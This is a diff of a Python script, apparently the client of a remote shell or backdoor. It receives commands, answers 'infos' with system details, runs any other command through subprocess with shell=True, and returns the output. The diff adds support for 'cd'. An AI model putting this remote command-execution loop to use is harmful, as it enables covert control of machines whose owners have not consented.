@@ -28,9 +28,18 @@ while True:
         break
     commande = commande_data.decode()
     print("Commande : ", commande)
-
+    commande_split = commande.split(" ")
     if commande == "infos":
         reponse = platform.platform() + " " + os.getcwd()
+    #else:
+    
+    elif len(commande_split) == 2 and commande_split[0] == "cd":
+        try:
+            os.chdir(commande_split[1])
+            reponse = ' '
+        except FileNotFoundError:
+            reponse = 'Erreur: Répertoire non valide.'
+
     else:
         resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True)
         reponse = resultat.stdout + resultat.stderr
